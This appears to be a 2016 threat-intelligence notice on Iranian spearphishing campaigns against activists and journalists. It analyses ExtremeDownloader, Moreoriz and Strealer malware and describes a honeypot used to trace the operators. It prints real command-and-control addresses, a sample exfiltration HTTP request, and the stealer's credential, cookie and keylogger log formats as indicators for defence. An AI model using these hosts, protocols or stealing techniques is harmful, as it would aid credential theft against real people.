Since the Technical Preview of our forthcoming Carnegie Endowment publication about state-sponsored
espionage campaigns was released at Black Hat USA, we have continued to disclose information about
current Iranian activities in order to promote public education and to provide indicators of compromise.

Within our Black Hat presentation, we identiﬁed but did not discuss a series of intrusion attempts conducted in
July and August, targeting human rights organizations, bloggers and foreign policy institutions. The social
engineering techniques and technical operations connected to these spearphishing attempts was moderately
more reﬁned than other incidents, and therefore warranted further scrutiny. On initial observation, we ﬁnd a
diverse set of tactics that have been used to compromise at least ninety uniquely identiﬁable malware victims
within a limited window into the overall activities, with more intrusions through credential theft. These
spearphishing campaigns are also notable since their targeting is more broad than Iranians activists, and
have a demonstrable interest in targets in Saudi Arabia, Iraq and Palestine.

This public notice is intended to describe a series of intrusions conducted through a suite of custom and offthe-shelf malware agents targeting interests aligned with the Iranian security policies. We also provide some
insight into the nature of the operators provided by their engagement in a honeypot under our control.

On August 4, 2016, the Gmail account of an
unknown individual was compromised in order to
conduct spearphishing campaigns against a
diverse set of targets related to Iran. The
spearphishing attempt posed as a message from
the Director of United for Iran, a U.S.-based human
rights organization, claiming that the organization
had developed a secure communications tool for
activists. The message was sent from an account
created under her name on lesser known email
provider (1&1’s Mail.com), a common tactic in
recent months, with a link to a ﬁle hosted on Dropbox and an additional credential phishing attempt. Once the
observed Gmail account was under their control, the actors then forwarded malware to over a hundred of
their contacts, ranging from an address for the United Nations Refugee Agency in Turkey to a site contact for

Reza Pahlavi, the son of the deposed Shah Mohammad Reza Pahlavi.

The incident represents only a more recent example of a common set of tactic and tools that have been used
by a discrete set of actors in Iran. Over the summer, we have found similar spearphishing attempts posing an
array of commonplace software, including Adobe Flash, TeamSpeak, Mozilla Firefox, and a video game
services company (Multiplay). Still other cases have included documents with embedded malware. In all of
these cases, the software is a primary stage dropper that provides reconnaissance and remote access for
further intrusions.

Our initial observation of the dropper and the
social engineering tactics came out a series of
documents that were sent to European human
rights advocates in July. These documents were
similarly sent from an impersonation account for
well-known organizations created on Mail.com,
under the pretense of important news. The
malware was embedded as an object in the
document that would be activated when the target
clicked on an icon, typically posing as an Excel ﬁle
or an image, which the message would claim were
lists of names or other items pertinent to the
target.

In our August 24 public notice "Increased Use of
Android Malware Targeting Journalists," we
documented a set of remote access tools for the
Android platform being used by Iranian actors to
target dissidents and independent media outside of the country. Included in that report was one commonplace
tool, DroidJack, which masqueraded as a secure communications tools. As recently as Sunday, August 28,
this RAT was used once again to target journalists and the foreign policy establishment, when the Telegram of
one prominent journalist was compromised – in this case, posing as an additional set of stickers for Telegram.
In this case, the RAT appeared to provide the intruders a vector to access Telegram credentials for individuals
outside of Iran, which is relevant to our description of other tactics used to breach users of the extremely
popular service. The Android malware in the previous notice mirrored a sustained campaign that we had
begun monitoring, including both agents impersonating TeamSpeak. Once again, in the case of the Telegram
sticker incident, Android malware was sent alongside a custom Windows agent.

The concurrent targeting and inclusion of both the custom Windows malware and the DroidJack APKs on one
ﬁctitious download site leads us to believe that the same group is behind the attempts. These campaigns
have occurred alongside Rocket Kitten infrastructure, but are conducted in a more professional manner with
distinct tools, representing either a subgroup or a separate effort. The effort may also be connected to other

known groups based on some indicators, so we do not attempt to attribute the actors at this point outside of
their Iranian origin and alignment with state interests.

Based on records from multiple command and control servers, we ﬁnd a distributed set of victims of the
malware, primarily Iranians inside of the country, Iranians abroad, and institutions in the Arabic-speaking
Middle East and North Africa. As we noted in our update on the Infy campaign in the Technical Preview,
mapping victimology based purely on IP addresses can be especially hard when it comes to Iran, due to the
widespread use of circumvention tools. However, we believe that the overall themes found within such
analysis are correct. The victimology of the malware also aligns with observed patterns in the targeting of
credential phishing and other social engineering activities by the group. In the interest of expediency, the
victimology and full set of tactics is not in scope of this disclosure, and instead we will provide more details on
the themes within our full publication.

As described previously, this actor makes use of a number of social engineering tricks. These tricks might
vary in nature, but quite often they involve bundling legitimate software installers with a copy of one of their
malware.

In the case of the TeamSpeak.EXE payload, once the bundle is executed it installs and launches the ﬁrst
stage of their malware toolset, normally located at %AppData%\Roaming\Microsoft\SpoonBuster\dwm.exe.
We call this ﬁrst stage sample ExtremeDownloader, due to a debug string that was left in the binary.

C:\Users\Not Found\Documents\Visual Studio
2013\Projects\ExtremeDownloader_alijavad_952\trunk\Downloader\Release\Downloader.pdb

The general purpose of ExtremeDownloader is to collect information on the infected system, send this
information to a remote location, and wait for instructions to eventually download and execute further
malicious software. All the exﬁltrated information is then categorized by an identiﬁer which is the combination
of the computer name and the hard disk volume serial number.

The preconﬁgured parameters, such as Command & Control location and encryption key, are recognizable in

the binary as base64 obfuscated strings.

This also includes a public 1024 RSA key:

-----BEGIN PUBLIC KEY----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDPlwHiG068RYDD1NLvCFAWNMs6
VR4I2kNuTei/+rCnUuj92hDFFXrntXIi7LLn8XsB3ls1sJ0RcAcrKVzQgzY+DOOT
A4dhOpFlO3v/bj3OwRqCdNJwJJfpYCBYQaLND9eo49BCK+pwVVB55TJYjCkVowGx
ZfJJdjYc3oDZKbKOawIDAQAB
-----END PUBLIC KEY-----

In order to proﬁle the system, ExtremeDownloader collects an extensive amount of details, including
information on the hardware, the networking, the existing users, processes, and services. In doing so, the
malware makes extensive use of WMI.

The aggregated proﬁle is then posted to the C&C with an HTTP request like following:

POST /utility/update/post.php HTTP/1.1
Accept: */*
Content-Type: multipart/form-data; boundary=D514116929C24f35AE047F2B82C59B08
Content-Length: 49810

User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .

[COMPUTER_IDENTIFIER]
--D514116929C24f35AE047F2B82C59B08
Content-Disposition: form-data; name="Data"

The content of the “Data” section would be the computer proﬁle in encrypted form, which would then be
stored in a dedicated folder on the C&C with the ﬁle name SysInfo.txt.

At this point, we believe the attackers would selectively decide which infected computers to compromise
further with the second stage malware. If instructed to do so, ExtremeDownloader would then download an
executable normally named contask.exe. We refer to this particular payload as Moreoriz, because of a mutex
it creates with name Global\Moreoriz, or simply Dropper, also due to a debug string found in the binary:

C:\Users\Not Found\Documents\Visual Studio 2013\Projects\TinyExe\Release\Dropper.pdb

This second stage dropper is limited in functionality, and it mostly used just to connect to a second Command
& Control server located at 5.152.202.53 on port 4545, to download and execute a copy of Metasploit
Meterpreter in order to grant a reverse shell to the attackers. In an effort to lure the attackers into interacting
with us that we describe in the following section of this report, we managed to obtain one of the collection
utilities they make use of. We refer to this malware as Strealer, also because of a debug string available in the
binary (please note the typo):

C:\Users\AB)\Documents\Visual Studio 2013\Projects\Strealer\Stealer_Final\Release\Stealer.pdb

While the name of the project and functionality recalls the Stealer malware of Flying Kitten, there does not
appear to be a relation between the agents as they don't appear to signiﬁcantly share characteristics.

Once executed, Strealer ﬁrst checks whether it is installed with persistence, and if not it copies itself to the
location %AppData%\Local\Mozilla\Proﬁles\MozillaService.exe and instantiates a new process from there.

The purpose of Strealer is to steal credentials and cookies from web browsers. Its design is very simple, and
yet effective. Strealer knows how to locate, decrypt, and read stored credentials and cookies from Internet
Explorer, Firefox, Chrome, and Opera. These stolen credentials are then normally stored in a JSON-like
format in the %AppData%\Local\Mozilla\Proﬁles\Log under the names for example like chromeLogins.sql and
chromeCookies.sql.

In the case of credentials, the log format would be:

{\"Username\":\"%s\",\"Password\":\"%s\",\"url\":\"%s\"}

While the following format is used for logging stolen cookies:

{\"id\":\"%S\",\"host\":\"%S\",\"name\":\"%S\",\"value\":\"%S\",\"path\":\"%S\",\"expiry\":\"%S\",\"isHttpOnly\":\"%S\",
\"isSecure\":\"%S\",\"hostOnly\":\"%S\",\"session\":\"%S\",\"storeId\":\"%S\"}

Additionally, the malware is also provided with a generic keylogger and clipboard stealer, which are simply
implemented with the traditional GetClipboardData and GetKeyboardState/GetKeyState techniques. The
intercepted keystrokes and clipboard are then nicely logged in detail in a dedicated ﬁle normally located at
%AppData%\Local\Mozilla\Proﬁles\Log\kgservice.sql. Following is an indicative content of how the keylogger
log ﬁle would look like:

[Chrome - Google Chrome]
date: 2016/8/31 time: 17:28:53
[Ctrl]
[Chrome - Google Chrome]
date: 2016/8/31 time: 17:28:53
google.com[Enter]
[New Tab - Google Chrome]
date: 2016/8/31 time: 17:28:55
[Ctrl]
[Untitled - Google Chrome]
date: 2016/8/31 time: 17:28:55
password[Ctrl]
********Start Clipboard*******
password
********END Clipboard*******

These logs are then collected and posted to yet another Command & Control server located at updateﬁnder.com. The structure utilized in the HTTP exﬁltration protocol, is very much similar to the ones adopted by
ExtremeDownloader.

When realizing that in the chain of compromise the attackers would manually interact with infected computers
through the use of a Meterpreter shell, we decided to set up a “honeypot.” We created a somewhat realistic
virtualized workstation which would appear belonging to a person engaged in researching on human rights
abuses in Iran. We downloaded publicly available reports, created a realistic folder structure, and installed
various commodity software that a regular person would use. Then we infected the “honeypot” workstation
with the Dropper, let it report back to its Command & Control and waited for activity.

Approximately one hour later we observed activity on the system. The attackers connected through their
Metasploit reverse shell, installed a copy of TightVNC, installed a copy of their Strealer backdoor and started
exﬁltrating data from our honeypot, while we pretended to unsuspectingly keep on working on document
drafts and reading reports from various human rights organizations, and chatting to some ﬁctitious third
person about some upcoming campaign.

When we noticed that some of the reports and documents we had downloaded from the Internet and placed
in the workstation were being exﬁltrated by the attackers, we swiftly created some documents with the
CanaryTokens service that had credible and interesting ﬁle names pertinent to human rights issues in Iran,
and placed them among other original ﬁles. CanaryTokens embeds remote resources as triggers inside
commonplace document, for example Ofﬁce ﬁles, to notify whenever they are opened and identify from which
IP address. Surely enough, the attackers exﬁltrated the baits, and opened them, resulting in alerts being
delivered to us.

The IP address from which the bait documents were opened appeared to be a VPN endpoint. We then
attempted creating similar bait documents with different ﬁle formats, in order to see whether that would trigger
a different behavior. Interestingly, this led to the attackers exﬁltrating and opening these newer documents
too, possibly from a different location, exposing what we believe to be their actual originating IP address.

This suggests the attackers are in fact of Iranian origin, and might be located in the city of Karaj, not far from
the capital Tehran.
